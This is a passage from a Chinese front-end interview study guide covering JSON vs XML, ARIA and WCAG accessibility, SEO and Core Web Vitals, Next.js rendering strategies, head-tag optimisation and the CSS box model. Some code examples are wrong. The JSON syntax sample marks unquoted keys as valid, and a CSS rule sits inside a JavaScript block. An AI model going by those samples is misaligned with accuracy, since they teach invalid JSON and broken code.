| SOAP API | XML 是 SOAP 协议规范 | REST + JSON |
| RSS/Atom | 历史原因（2000年代） | JSON Feed |
| SVG | SVG 是 XML 格式 | ✅ 无替代 |
| Office 文档 | .docx/.xlsx 内部是 ZIP+XML | — |
| 配置文件 | Java/XML 遗留项目 | YAML/JSON/TOML |
| SAML/OAuth | 企业 SSO 协议 | OIDC/JWT |

## 22.4 JSON 详解

### JSON 语法

```json
// 正确
{ "name": "张三", "age": 30 }

// 错误示例
{
  name: "张三",      // ❌ 键必须加引号（简单值除外）
  'age': 30,         // ❌ 只能用双引号
  age: null,         // ✅ 支持 null
  active: true,     // ✅ 支持 boolean
  score: [1, 2, 3]  // ✅ 支持数组
}
```

### JSON 的优势

| 优势 | 说明 |
|------|------|
| 解析速度快 | 原生 `JSON.parse()`，无需 DOM 解析 |
| 体积更小 | 无冗余标签，数据密度高 |
| 类型丰富 | 支持 null、boolean、number、string、array，object |
| 跨语言 | JavaScript/Python/Java/Go 都有原生支持 |
| 无循环引用 | JSON 结构简单，不会有循环引用问题 |

### JSON 的局限

| 局限 | 说明 |
|------|------|
| 无注释 | 不能加注释（可考虑 JSON5/JSONC） |
| 无小数精度保证 | JavaScript number 精度问题 |
| 无日期类型 | 只能传字符串或时间戳 |
| 无 undefined | undefined 会被忽略 |
| 无循环引用 | 包含循环引用的对象无法序列化 |

```javascript
// JSON.stringify 的限制
const obj = {
  name: "张三",
  fn: () => {},       // ❌ 函数被忽略
  undefinedVal: undefined, // ❌ 被忽略
  symbol: Symbol('s'), // ❌ 被忽略
  bigInt: BigInt(123), // ❌ 报错
};
JSON.stringify(obj); // '{"name":"张三"}'
```

## 22.5 互相转换

### HTML ↔ XHTML

```javascript
// HTML 转 XHTML 规则
1. 所有标签小写
2. 所有属性加引号
3. 所有标签闭合（包括 <br> → <br />）
4. 属性值加引号（checked → checked="checked"）
5. 根元素必须有 xmlns 属性
```

### JSON ↔ XML

```javascript
// JSON 转 XML（简单转换）
function jsonToXml(obj, root = 'root') {
  let xml = `<${root}>`;
  for (const [key, value] of Object.entries(obj)) {
    if (typeof value === 'object' && value !== null) {
      xml += jsonToXml(value, key);
    } else {
      xml += `<${key}>${value}</${key}>`;
    }
  }
  xml += `</${root}>`;
  return xml;
}

// XML 转 JSON（用 DOMParser）
const parser = new DOMParser();
const doc = parser.parseFromString(xmlString, 'text/xml');
// 遍历 doc 构建 JSON 对象
```

## 22.6 面试 follow-up 问题

### Q1: 为什么现代 Web 开发中 JSON 取代了 XML 成为主流数据格式？

**答案：**
1. **语法简洁**：JSON 无需闭合标签、无需大写敏感，体积比 XML 小 20-30%
2. **解析速度**：JSON.parse() 比 XML DOM 解析快 5-10 倍
3. **原生支持**：JavaScript 直接处理，无需额外解析器
4. **类型丰富**：支持 null、boolean、number，XML 只有文本
5. **API 设计**：RESTful API + JSON 成为事实标准（90%+ 新 API）

---

### Q2: XHTML 和 HTML5 有什么区别？

**答案：**
- **XHTML**：XML 语法的 HTML，要求严格闭合标签、小写、引号
- **HTML5**：融合了宽松语法（HTML4 风格）和新特性（video、canvas、WebSocket）

| 对比 | XHTML | HTML5 |
|------|-------|-------|
| 语法 | 严格 XML | 宽松 + 规范 |
| DTD | 需要声明 | 不需要 |
| 解析 | XML 解析器 | HTML5 解析算法 |
| 新标签 | 无 | video/audio/canvas/header/main |
| API | 少 | 丰富的 JS API |
| 浏览器支持 | 全部 | 全部（更一致） |

---

### Q3: SVG 是 XML 格式，这带来什么优势和问题？

**答案：**
**优势：**
- 可编程：通过 JavaScript 操作 SVG DOM
- 可压缩：文本格式，gzip 压缩率高
- 可搜索：文本内容可被搜索引擎索引
- 可编辑：可用文本编辑器打开和修改
- 可动画：CSS/JS/SMIL 多种动画方式

**问题：**
- 复杂 SVG 体积大（需要优化工具如 SVGO）
- 浏览器兼容性问题（不同浏览器渲染略有差异）
- 大数量节点性能差（复杂图表建议用 Canvas）
- 需要处理命名空间（SVG/MathML/Mixed）

---

> 📚 参考：
> - https://www.w3.org/TR/html52/ （HTML5.2 规范）
> - https://developer.mozilla.org/en-US/docs/Web/XML/XML_reference
> - https://www.json.org/json-zh.html （JSON 官方）
> - https://blog.csdn.net/weixin_45736650/article/details/126296426

---

### 23. 微格式（microdata）/ aria-* / a11y / screen reader

#### 23.1 定义与核心原理

**微格式（HTML Microdata）** 是在 HTML 中嵌入语义化机器可读数据的 W3C 标准（现已逐渐被 JSON-LD 取代）。通过 `itemscope`/`itemprop` 属性，将语义数据嵌入 HTML 供搜索引擎和工具解析。

**ARIA（Accessible Rich Internet Applications）** 是一套为复杂自定义组件补充语义的标准，通过向 **Accessibility Tree** 注入额外语义节点，让屏幕阅读器能正确理解自定义组件的结构和状态。

#### 23.2 微格式 vs JSON-LD（Schema.org）

**微格式（旧标准，逐步淘汰）：**
```html
<div itemscope itemtype="https://schema.org/Person">
  <h1 itemprop="name">张三</h1>
  <img itemprop="image" src="photo.jpg" alt="照片">
  <span itemprop="jobTitle">高级前端工程师</span>
  <a itemprop="email" href="mailto:zhang@example.com">邮箱</a>
</div>
```

**JSON-LD（现代标准，推荐）：**
```html
<!-- 在 <head> 中嵌入，SEO 最优，不污染 DOM 语义 -->
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Person",
  "name": "张三",
  "jobTitle": "高级前端工程师",
  "email": "mailto:zhang@example.com",
  "image": "https://example.com/photo.jpg"
}
</script>
```

**为什么 JSON-LD 优于微格式？**

| 维度 | 微格式（Microdata） | JSON-LD |
|------|---------------------|--------|
| 位置 | 内嵌 HTML，污染 DOM | 独立 script 块，不影响 DOM |
| 语法验证 | 依赖 HTML 解析器 | 独立 JSON 验证 |
| 工具支持 | 逐渐减少 | Google / Bing / Yandex 全面支持 |
| 维护性 | 属性散落各处 | 集中在 head，维护简单 |
| 推荐度 | ❌ 逐步淘汰 | ✅ **强烈推荐** |

#### 23.3 ARIA 属性全景详解

**ARIA 的三条黄金定律（必背）：**
> 1. **能用原生 HTML 实现的功能，不使用 ARIA**
> 2. **不要在原生 HTML 元素上添加冗余 ARIA**（如 `<nav role="navigation">` 是冗余的）
> 3. **所有 ARIA 属性都必须有效**

**role（角色）分类：**

| 类别 | role 值 | 说明 |
|------|---------|------|
| 文档结构 | `banner/navigation/main/contentinfo/complementary` | 对应 HTML5 语义标签 |
| 组件角色 | `button/checkbox/radio/menuitem/tab/tabpanel` | 对应原生交互组件 |
| 组件结构 | `list/listitem/tree/treeitem` | 列表类组件 |
| 实时区域 | `status/alert/log/marquee/progressbar` | 动态内容区 |

**常用 aria-* 属性详解：**

```html
<!-- 标签类：提供可访问名称 -->
<button aria-label="关闭对话框">X</button>
<button aria-labelledby="title-id">打开</button>

<!-- 描述类：提供额外说明 -->
<input aria-describedby="error-hint password-hint">
<p id="error-hint">此字段必填</p>
<p id="password-hint">至少8位，包含数字和字母</p>

<!-- 状态类：声明组件状态 -->
<button aria-pressed="false">收藏</button>           <!-- 切换按钮 -->
<input aria-checked="true" type="checkbox">           <!-- 复选框 -->
<div aria-expanded="false" aria-controls="menu">菜单</div> <!-- 折叠 -->

<!-- 实时区域：通知屏幕阅读器动态变化 -->
<div aria-live="polite">新消息：3条未读</div>    <!-- 等待空闲时朗读 -->
<div aria-live="assertive">操作失败</div>        <!-- 立即打断当前朗读 -->
<div aria-atomic="true">更新计数器：5/10</div>  <!-- 整个区域作为整体播报 -->
```

**aria-live 的取值与行为：**

| 值 | 触发时机 | 典型场景 |
|---|---------|---------|
| `off`（默认） | 不通知 | 静态内容 |
| `polite` | 等待当前朗读结束后通知 | 消息列表追加、非紧急更新 |
| `assertive` | **立即打断**当前朗读 | 错误提示、支付失败、紧急通知 |

> ⚠️ **警告**：`aria-live="assertive"` 会立即打断用户当前操作，使用时极其谨慎——用 `polite` 能解决的场景坚决不用 `assertive`。

#### 23.4 无障碍核心：WCAG POUR 原则

| 原则 | 核心要求 | 关键检查点 |
|------|---------|-----------|
| **P — Perceivable（可感知）** | 所有信息可通过某种方式感知 | 图片有 alt、视频有字幕、颜色对比度 ≥ 4.5:1 |
| **O — Operable（可操作）** | 所有功能可通过键盘操作 | Tab 导航、focus 可见、无键盘陷阱 |
| **U — Understandable（可理解）** | 信息和操作可理解 | 一致导航、错误提示、语言声明 `lang` |
| **R — Robust（健壮）** | 兼容各类辅助技术 | 符合 HTML 规范、ARIA 正确使用 |

**WCAG 2.1 AA 合规 checklist（前端必须检查项）：**
- [ ] 所有图片有 `alt` 属性（装饰性图片用 `alt=""` + `aria-hidden="true"`）
- [ ] 表单有显式 `<label>` 关联（不能用 placeholder 替代 label）
- [ ] 颜色对比度 ≥ 4.5:1（文字）/ 3:1（大文字 ≥ 18pt）
- [ ] 所有交互控件可通过键盘聚焦和操作
- [ ] Focus 顺序合理（Tab 顺序与视觉顺序一致）
- [ ] Focus 样式可见（不能 `outline: none` 而无替代）
- [ ] 无 heading 跳级（h1 → h3，跳过 h2 是不合规的）
- [ ] 页面有 `lang` 属性（`<html lang="zh-CN">`）

#### 23.5 屏幕阅读器工作原理

```
DOM 树
  ↓
[Accessibility Tree 生成器]
  ↓ 注入 ARIA 语义
  ↓
Accessibility API 节点（Windows: IAccessible2 / macOS: NSAccessibility）
  ↓
屏幕阅读器（NVDA + Firefox / JAWS + Chrome / VoiceOver + Safari）
  ↓
语音/盲文输出给用户
```

**常见屏幕阅读器：**
| 平台 | 阅读器 | 推荐组合 |
|------|--------|---------|
| Windows | NVDA（免费）| + Firefox |
| Windows | JAWS（商业）| + Chrome |
| macOS/iOS | VoiceOver | + Safari |
| Android | TalkBack | + Chrome |

#### 23.6 常见坑点与最佳实践

| 坑点 | 错误写法 | 正确写法 |
|------|---------|---------|
| placeholder 替代 label | `<input placeholder="邮箱">` | `<label for="e">邮箱</label><input id="e" placeholder="...">` |
| 装饰性图片无 alt | `<img src="decoration.svg">` | `<img src="decoration.svg" alt="" aria-hidden="true">` |
| 冗余 ARIA | `<nav role="navigation">` | `<nav>`（原生已携带 role） |
| 图片按钮无标签 | `<button><img src="close.png"></button>` | `<button><img src="close.png" alt="关闭"></button>` 或 `<button aria-label="关闭">` |
| 动态更新无通知 | `div.textContent = '已保存'` | `<div aria-live="polite">已保存</div>` |
| 模态框无焦点锁定 | dialog 打开后 Tab 跳到背景 | 焦点锁定在 dialog 内，关闭后焦点回触发元素 |

**Focus 管理最佳实践（模态框）：**
```javascript
class Modal {
  constructor() {
    this.previousFocus = null; // 记住打开前的焦点元素
  }

  open() {
    this.previousFocus = document.activeElement; // 记录
    this.dialog.showModal();
    // 焦点锁定到第一个可聚焦元素
    this.dialog.querySelector('button, [href], input').focus();
  }

  close() {
    this.dialog.close();
    // 焦点回到触发元素
    this.previousFocus?.focus();
  }
}

// CSS：dialog 外部不可聚焦
dialog::backdrop { background: rgba(0,0,0,0.5); }
dialog:not([open]) { display: none; }
```

#### 23.7 高频面试追问

**Q1：`aria-label`、`aria-labelledby`、`aria-describedby` 三者的区别是什么？**
> `aria-label`：显式提供可访问名称，**覆盖**元素内部文本（当两者同时存在时，内部文本被忽略）
> `aria-labelledby`：引用页面中**另一个元素**的文本作为标签，优先级高于 `aria-label`
> `aria-describedby`：引用描述性文本，**补充** label，不替代——屏幕阅读器先读 label，再读 description
> 优先级：`aria-labelledby` > `aria-label` > 元素内部文本 > `aria-describedby`

**Q2：SPA 路由切换时，屏幕阅读器用户如何感知页面变化？**
> 默认情况下**无法感知**。解决方案：
> 1. 在每个页面 `<main>` 或 `<h1>` 上设置 `aria-live="polite"`
> 2. 路由切换时，向 live region 写入"已导航至 XX 页面"
> 3. 路由切换完成后，`focus()` 到新页面 `<h1>` 或 `<main>`
> 4. 配合 `document.title` 更新（屏幕阅读器会朗读标题）

**Q3：Lighthouse Accessibility 得分 100 分，是否等同于 WCAG 2.1 AA 合规？**
> **不等于**。Lighthouse 只能检测**静态可验证**的问题（约覆盖 WCAG 约 30-40% 的规则）。以下问题无法被自动检测：
> - 键盘焦点的实际顺序（需要手动 Tab 测试）
> - 颜色对比度的精确值（自动化只能检测 CSS 中的声明值）
> - 动态内容（AJAX/React/Vue 条件渲染）的无障碍性
> - 屏幕阅读器的真实朗读效果（必须用 NVDA/VoiceOver 实测）
> - 认知障碍用户的可用性

> 📚 参考：
> - [W3C WAI — WCAG 2.1](https://www.w3.org/WAI/standards-guidelines/wcag/)
> - [MDN — ARIA](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA)
> - [MDN — ARIA Roles](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles)
> - [WebAIM — WebAIM Million](https://webaim.org/projects/million/)
> - [axe-core — Accessibility Testing](https://www.deque.com/axe/)

---

# Section 24: SEO 优化：Core Web Vitals、Meta 标签、渲染策略与最佳实践

> 更新日期：2026-05-10 | 版本：2.0 | 覆盖：HTML / CSS / JavaScript / TypeScript / 浏览器 / 网络 / 安全 / React / Vue / 工程化 / 性能优化

---

## 24.1 Core Web Vitals（CWV）核心指标

Google 以 Core Web Vitals 作为页面体验（Page Experience）信号纳入排名因素。2024年5月起，INP（Interaction to Next Paint）正式取代 FID（First Input Delay），成为 Core Web Vitals 三件套之一。

### 24.1.1 三大指标速览

| 指标 | 全称 | 衡量什么 | 良好（Good） | 需改进（Needs Improvement） | 差（Poor） |
|------|------|---------|-------------|---------------------------|-----------|
| **LCP** | Largest Contentful Paint | 最大内容绘制时间（页面主要内容的加载速度） | ≤ 2.5s | 2.5s ~ 4.0s | > 4.0s |
| **CLS** | Cumulative Layout Shift | 累计布局偏移（视觉稳定性） | ≤ 0.1 | 0.1 ~ 0.25 | > 0.25 |
| **INP** | Interaction to Next Paint | 交互响应性（取代 FID，衡量所有用户交互的延迟） | ≤ 200ms | 200ms ~ 500ms | > 500ms |

> 📚 参考：MDN - Interaction to Next Paint 定义（2026），https://developer.mozilla.org/en-US/docs/Glossary/Interaction_to_next_paint

### 24.1.2 LCP 优化策略

**LCP 是指页面视口内最大元素（如英雄图、标题文本）的渲染时间，通常是页面加载性能的瓶颈。**

#### 关键资源加载优化

```html
<!-- 预加载 LCP 元素（首屏关键图片） -->
<link rel="preload" href="/hero.webp" as="image">

<!-- 预连接关键域名（减少 DNS/TLS 握手时间） -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
```

```css
/* 字体优化：使用 font-display: swap 避免文字阻塞 */
@font-face {
  font-family: 'MyFont';
  src: url('/fonts/myfont.woff2') format('woff2');
  font-display: swap;
}
```

#### Next.js 14 App Router 中的图片优化

```tsx
// app/page.tsx
import Image from 'next/image';

export default function Hero() {
  return (
    // priority=true 触发预加载，fetchpriority="high" 告知浏览器高优先级
    <Image
      src="/hero.webp"
      alt="产品介绍主图"
      width={1920}
      height={1080}
      priority           // 等价于 loading="eager"，同时生成 preload hint
      fetchPriority="high"
      sizes="(max-width: 768px) 100vw, 50vw"
    />
  );
}
```

#### LCP 优化决策表

```
LCP 问题根因                → 推荐解决方案
─────────────────────────────────────────────────────
服务器响应慢（TTFB 高）      → 启用 CDN、使用 SSG/ISR 减少服务端计算
LCP 图片未优化              → WebP/AVIF 格式 + 图片 CDN + preload
字体阻塞                    → preload 字体文件 + font-display:swap
渲染阻塞 JS/CSS             → 内联关键 CSS，defer 非关键 JS
内联关键 CSS，异步加载其余   → Critical CSS 提取工具（critters）
```

> 📚 参考：前端性能优化：LCP 与 CLS 指标的优化策略（CSDN 2025），https://blog.csdn.net/2501_93895491/article/details/154149853

### 24.1.3 CLS 优化策略

**CLS 衡量页面生命周期中非预期布局偏移的累积值。偏移越大，用户体验越差（误点按钮、阅读被打断）。**

#### 核心原则：给所有媒体元素预留空间

```tsx
// ✅ 所有图片/视频必须指定 width 和 height（或 aspect-ratio）
<Image
  src="/product.jpg"
  alt="商品图"
  width={800}
  height={600}
  style={{ aspectRatio: '4/3' }} // 备用方案
/>

// ✅ 动态内容（广告、推荐）预留固定容器高度
<div style={{ minHeight: '120px' }}>
  {/* 动态加载的内容 */}
</div>
```

### 24.1.4 INP 优化策略

**INP（Interaction to Next Paint）** 衡量用户交互（点击、键盘输入）到视觉反馈的时间。优化方向：

```
[ ] 长任务拆分：单个任务不超过 50ms，使用 scheduler.yield() 让步
[ ] 第三方脚本延迟加载：chatbot、分析工具用 script async/defer
[ ] 事件委托：减少重复绑定，同一父元素用 onClick 统一处理
[ ] CSS 动画：只用 transform/opacity，不触发 Layout/Paint
[ ] 懒加载非首屏组件：减少 JS Bundle 大小，加快 TTI
[ ] Web Worker：将重计算移出主线程（格式转换、加密等）
[ ] DOM 节点数建议 < 1400（Google 基准）
[ ] React 19 useOptimistic：提升交互感知速度
```

> 📚 参考：五个超级有效优化 React 中 INP 的技巧（掘金 2025），https://juejin.cn/post/7468141313423638567

---

## 24.2 SEO Meta 标签体系

### 24.2.1 robots meta 指令

```tsx
// Next.js App Router 中的 robots 配置
export const metadata: Metadata = {
  robots: {
    index: true,        // 允许爬虫索引（默认 true）
    follow: true,       // 跟随链接（默认 true）
    googleBot: {
      index: true,
      follow: true,
      'max-image-preview': 'large',
      'max-snippet': -1,    // 不限制摘要长度
    },
  },
};
```

**输出 HTML：**

```html
<meta name="robots" content="index, follow">
<meta name="googlebot" content="index, follow, max-image-preview:large, max-snippet:-1">
```

#### 常见 robots 指令场景

| 指令 | 场景 | 说明 |
|------|------|------|
| `noindex, follow` | 登录页/后台页面 | 不索引但允许爬取链接 |
| `noindex, nofollow` | 隐私政策/法律页面 | 完全阻止索引 |
| `index, nofollow` | 用户生成内容页（如搜索结果） | 索引但不跟踪外链 |

### 24.2.2 canonical URL（规范化链接）

```tsx
// app/layout.tsx - 全局设置默认 canonical
export const metadata: Metadata = {
  alternates: {
    canonical: 'https://example.com',
  },
};

// app/blog/[slug]/page.tsx - 动态页面覆盖
export async function generateMetadata({ params }: Props): Promise<Metadata> {
  const post = await getPost(params.slug);
  return {
    alternates: {
      canonical: `https://example.com/blog/${params.slug}`,
    },
  };
}
```

**作用：** 防止 www vs 非 www、HTTP vs HTTPS、带参 URL 等导致的重复内容问题。

### 24.2.3 完整的 SEO Metadata 配置（Next.js 14 App Router）

```tsx
// app/blog/[slug]/page.tsx
type Props = { params: { slug: string } };

export async function generateMetadata({ params }: Props): Promise<Metadata> {
  const post = await getPost(params.slug);
  const canonicalUrl = `https://example.com/blog/${params.slug}`;

  return {
    title: `${post.title} | 前端面试指南`,
    description: post.excerpt,                        // 150-160 字符
    keywords: post.tags.join(', '),                  // 次要，Google 已不再重视
    authors: [{ name: '张三', url: 'https://example.com/about' }],
    openGraph: {
      title: post.title,
      description: post.excerpt,
      url: canonicalUrl,
      siteName: '前端面试指南',
      locale: 'zh_CN',
      type: 'article',
      publishedTime: post.datePublished,
      images: [{ url: post.coverImage, width: 1200, height: 630, alt: post.title }],
    },
    twitter: {
      card: 'summary_large_image',
      title: post.title,
      description: post.excerpt,
    },
    alternates: { canonical: canonicalUrl },
    robots: { index: true, follow: true, googleBot: { index: true, follow: true } },
  };
}
```

---

## 24.3 渲染策略（SSR vs SSG vs ISR vs CSR）

### 24.3.1 四种渲染策略对比

| 策略 | 说明 | 首屏 | SEO | 交互性 | 适用场景 |
|------|------|------|-----|--------|---------|
| **CSR** | 客户端渲染，JS 生成内容 | 慢（白屏） | 需等待 JS | 最快 | 管理后台、个性化 DashBoard |
| **SSR** | 服务端实时渲染 | 快 | ✅ 优 | 中（需 hydrate） | 需要实时数据的页面 |
| **SSG** | 构建时生成静态 HTML | 最快 | ✅ 优 | 差（纯静态） | 博客、文档、营销页 |
| **ISR** | 增量静态，再生成 | 快 | ✅ 优 | 中（再生成期间旧） | 内容更新频繁的页面 |

### 24.3.2 Next.js 14 App Router 中的渲染策略

```tsx
// SSG（构建时生成）- 静态博客列表
export async function generateStaticParams() {
  const posts = await getAllPosts();
  return posts.map((post) => ({ slug: post.slug }));
}

// ISR（增量静态）- 内容定期更新
export const revalidate = 3600; // 每小时重新验证

// SSR（服务端渲染）- 动态数据
export const dynamic = 'force-dynamic';

// PPR（Partial Prerendering）- Next.js 15 实验特性
// 同时流式输出静态 HTML shell + 动态 Suspense 边界
```

### 24.3.3 渲染策略选择决策树

```
内容是否需要实时个性化？
├── 是 → CSR（个性化首页、用户 Dashboard）
├── 否 → 内容是否经常变化？
    ├── 是（频繁更新） → ISR（新闻、博客）
    ├── 否 → 页面数量是否有限？
        ├── 是（<1000页）→ SSG（文档、营销页）
        └── 否（>1000页）→ SSR + 缓存（大型电商）
```

---

## 24.4 JSON-LD 结构化数据

**JSON-LD 是 Google 推荐的结构化数据格式，放置在 `<head>` 中的 `<script type="application/ld+json">` 内。**

### 常见 Schema 类型

| 页面类型 | 推荐 Schema | 说明 |
|---------|------------|------|
| 博客文章 | Article | 博客、新闻、教程 |
| 产品 | Product | 商品信息、价格、评分 |
| 视频 | VideoObject | 视频内容、时长、缩略图 |
| 本地商家 | LocalBusiness | 地址、电话、营业时间 |
| 问答 | FAQPage | 常见问题解答 |
| 面包屑 | BreadcrumbList | 导航路径 |

### Article 类型示例

```tsx
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "Article",
  "headline": "前端面试完整题库 2026",
  "image": "https://example.com/cover.jpg",
  "author": {
    "@type": "Person",
    "name": "张三",
    "url": "https://example.com/about"
  },
  "publisher": {
    "@type": "Organization",
    "name": "前端面试指南",
    "logo": { "@type": "ImageObject", "url": "https://example.com/logo.png" }
  },
  "datePublished": "2026-01-15",
  "dateModified": "2026-05-10"
}
</script>
```

验证工具：https://search.google.com/test/rich-results

---

## 24.5 常见 SEO 陷阱与排查

| 症状 | 根因 | 解决方案 |
|------|------|---------|
| 页面未被抓取 | robots.txt 阻止 / noindex | 检查 robots.txt，添加 sitemap |
| 内容重复 | 多 URL 指向同一内容 | 添加 canonical + 规范 URL |
| 排名下降 | 大量 404 链接 / 内容变更 | 使用 301 重定向，提交更新 sitemap |
| 图片未索引 | 缺少 alt 属性 / 懒加载 | 添加 alt，提供图片 sitemap |
| JS 内容未收录 | CSR 内容 Google 未渲染 | 改用 SSR/SSG，或添加 HTML 快照 |

---

## 24.6 面试 follow-up 问题

### Q1: LCP 波动大（有时快有时慢）的根因是什么？

**答案：**
LCP 波动通常由以下原因导致：
1. **缓存命中率不一致**：动态内容（如个性化 hero 图）无法被 CDN 缓存
2. **网络波动**：第三方资源（如字体、API）响应时间不稳定
3. **CLS 导致延迟**：图片无尺寸导致布局偏移，LCP 元素位置变化
4. **JavaScript 阻塞**：同步脚本延迟了 LCP 资源加载

解决：确保 LCP 元素是静态的（同一 URL）、使用 `fetchpriority="high"`、预加载关键资源。

---

### Q2: SSG 和 SSR 各自的不可替代场景是什么？

**答案：**
- **SSG 不可替代**：构建时数据已固定的页面（文档站、博客、帮助中心），构建速度最快，SEO 最优
- **SSR 不可替代**：需要用户个性化内容的页面（个性化首页、用户专属 Dashboard），或内容依赖实时数据库/外部 API

最佳实践：**同构（SSR + 缓存）** 或 **ISR**（频繁更新但可缓存），而非非此即彼。

---

### Q3: JSON-LD 能直接提升搜索排名吗？

**答案：**
**不能直接提升排名**，但对 SEO 有间接帮助：
1. **丰富摘要（Rich Snippets）**：搜索结果出现星级、价格、FAQ 等样式，提升 CTR（点击率）
2. **帮助爬虫理解内容**：结构化数据让 Google 更准确理解页面主题
3. **语音搜索优化**：FAQ 结构化数据对语音搜索有帮助

**JSON-LD 的核心价值是让 Google 正确"读懂"你的内容，而非直接传递排名信号。**

---

> 📚 参考：
> - https://developer.chrome.com/docs/crux（Chrome UX Report）
> - https://nextjs.org/docs/app/building-your-application/optimizing/metadata（Next.js Metadata API）
> - https://schema.org/docs/schemas.html（Schema.org 类型参考）
> - https://search.google.com/test/rich-results（结构化数据测试工具）

---

### 25. favicon 配置 / dns-prefetch / 首屏 HTML 优化

#### 25.1 favicon 配置

```html
<!-- 现代多格式 favicon（放在 <head> 中） -->
<link rel="icon" type="image/svg+xml" href="/favicon.svg">
<!-- PNG favicon（兼容性最强） -->
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16.png">

<!-- Apple Touch Icon（iOS 添加到主屏幕） -->
<link rel="apple-touch-icon" href="/apple-touch-icon.png">

<!-- Windows 磁贴 -->
<meta name="msapplication-TileColor" content="#4A90E2">
<meta name="msapplication-TileImage" content="/tile.png">

<!-- theme-color：浏览器地址栏颜色 -->
<meta name="theme-color" content="#4A90E2">
```

#### 25.2 dns-prefetch 预解析

```html
<!-- 提前解析第三方域名 DNS -->
<link rel="dns-prefetch" href="//fonts.googleapis.com">
<link rel="dns-prefetch" href="//cdn.example.com">
<link rel="dns-prefetch" href="//analytics.example.com">

<!-- preconnect：更进一步，预先建立 TCP + TLS 连接 -->
<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
```

#### 25.3 首屏 HTML 优化

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <!-- 1. charset 必须在最前面（前 1024 字节内） -->
  <meta charset="UTF-8">

  <!-- 2. viewport 必须 -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- 3. title 和 description -->
  <title>关键：快速加载的标题</title>
  <meta name="description" content="简短描述">

  <!-- 4. 关键 CSS 内联（避免渲染阻塞） -->
  <style>
    /* 首屏渲染必需的关键样式 */
    body { margin: 0; font-family: sans-serif; }
    .header { background: #fff; }
    /* 仅包含首屏可见内容所需的 CSS */
  </style>

  <!-- 5. 非关键 CSS 异步加载 -->
  <link rel="stylesheet" href="non-critical.css" media="print" onload="this.media='all'">

  <!-- 6. 预连接关键域名 -->
  <link rel="preconnect" href="https://your-cdn.com" crossorigin>

  <!-- 7. 预加载关键资源 -->
  <link rel="preload" href="fonts/main.woff2" as="font" crossorigin>
  <link rel="preload" href="hero-image.webp" as="image">

  <!-- 8. 延迟加载非首屏 JS -->
  <script defer src="analytics.js"></script>
</head>
<body>
  <!-- 9. 首屏内容直接可用（SSR 或 内联关键 HTML） -->
  <div id="app">
    <!-- 服务器端渲染的初始 HTML -->
  </div>

  <!-- 10. defer JS 在 body 末尾 -->
  <script defer src="app.js"></script>
</body>
</html>
```

**Critical CSS（关键渲染路径 CSS）：**
- 提取首屏可见内容所需的 CSS
- 内联到 `<head>` 中（避免额外网络请求）
- 非关键 CSS 异步加载（不阻塞渲染）

---

## 二、CSS 超高频八股

---

### 1. CSS 盒模型

#### 1.1 标准盒模型（W3C Box Model）

```
┌──────────────────────────────────────┐
│              margin                  │
│  ┌────────────────────────────────┐  │
│  │           border               │  │
│  │  ┌──────────────────────────┐  │  │
│  │  │        padding           │  │  │
│  │  │  ┌────────────────────┐  │  │  │
│  │  │  │                    │  │  │  │
│  │  │  │     content        │  │  │  │
│  │  │  │   width/height     │  │  │  │
│  │  │  │                    │  │  │  │
│  │  │  └────────────────────┘  │  │  │
│  │  └──────────────────────────┘  │  │  │
│  └────────────────────────────────┘  │
└──────────────────────────────────────┘

元素总宽度 = margin-left + border-left + padding-left
           + width（content）
           + padding-right + border-right + margin-right

元素总高度 = margin-top + border-top + padding-top
           + height（content）
           + padding-bottom + border-bottom + margin-bottom
```

#### 1.2 IE 盒模型（替代盒模型）

```
width = content + padding + border（全部包含在内）
height 同理

┌──────────────────────────────────────┐
│              margin                  │
│  ┌────────────────────────────────┐  │
│  │  border  │    padding    │content│  │
│  └────────────────────────────────┘  │
└──────────────────────────────────────┘
```

#### 1.3 box-sizing 属性

```css
/* 默认：标准盒模型（content-box） */
/* width = 内容区的宽度，不含 padding 和 border */
.box1 {
  box-sizing: content-box;
  width: 200px;
  padding: 20px;
  border: 10px solid #000;
  /* 实际渲染宽度 = 200 + 20*2 + 10*2 = 260px */
}

/* 推荐：IE 盒模型（border-box） */
/* width = 内容 + padding + border 的总宽度 */
.box2 {
  box-sizing: border-box;
  width: 200px;
  padding: 20px;
  border: 10px solid #000;
  /* 内容区实际宽度 = 200 - 20*2 - 10*2 = 140px */
  /* 总渲染宽度始终为 200px */
}
```

**为什么推荐 `box-sizing: border-box`：**
- 元素宽度更直观，方便布局计算
- 配合 Flexbox/Grid 使用时更易控制尺寸
- 避免"加了 padding/border 盒子就变大"的问题

```css
/* 全局设置（现代 CSS 项目推荐） */
*, *::before, *::after {
  box-sizing: border-box;
}
```

---

### 2. margin 塌陷与 BFC

#### 2.1 margin 塌陷（Collapsing Margin）

当两个垂直方向（上下）的 margin 相邻时，它们会合并为一个 margin，取较大值。

```
┌─────────────┐
│  父元素     │
│ ┌─────────┐ │
│ │ 子元素   │ │
│ │ margin-top: 20px │     margin-top 合并
│ └─────────┘ │
└─────────────┘
         ↓ 合并为 20px（而不是 20px + 20px）

两个垂直相邻的 margin 会塌陷：
.margin1 { margin-bottom: 20px; }
.margin2 { margin-top: 30px; }
// 最终间距 = max(20, 30) = 30px（不是 50px）
```

**margin 塌陷的三种情况：**
1. 相邻兄弟元素之间
2. 父元素与第一个/最后一个子元素之间
3. 空的块级元素（上下 margin 相遇）

#### 2.2 什么是 BFC

**BFC（Block Formatting Context，块格式化上下文）** 是 CSS 渲染模型中的一个独立区域，定义了块级盒子的布局规则。

**BFC 特性：**
- 属于 BFC 的盒子垂直排列（相对于同个 BFC 内的相邻盒子）
- BFC 内部的 margin 不会与外部的元素塌陷
- BFC 不被浮动元素覆盖
- 计算 BFC 高度时，浮动子元素也参与计算（清除浮动）

```
┌──────────────────────────────────────────┐
│         BFC 区域（独立渲染上下文）          │
│                                          │
│  ┌─────────┐  ← 同一个 BFC 内，垂直排列   │
│  │ Box 1   │                            │
│  └─────────┘                            │
│       ↓ margin 折叠                      │
